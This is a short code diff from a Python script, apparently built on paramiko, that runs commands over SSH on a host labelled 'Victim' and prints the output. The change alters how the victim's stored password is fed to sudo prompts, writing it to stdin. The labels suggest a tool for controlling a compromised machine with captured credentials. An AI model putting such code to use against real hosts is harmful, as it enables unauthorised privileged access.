@@ -73,13 +73,16 @@ def ssh_command_using_ssh_key(command):
         print('[Command] ' + command)
         session.exec_command(command)
 
+
         print('\n--------Victim Std Out--------')
         print(session.recv(2048))
         print('--------Victim Std Out--------\n')
 
         if command.find('sudo') > -1:
             print('sudo is coming!!')
-            session.exec_command(victim['password'])
+            stdin = session.makefile('wb', -1)
+            stdin.write(victim['password']+'\n')
+            stdin.flush()
 
             print('\n--------Victim Std Out--------')
             print(session.recv(2048))
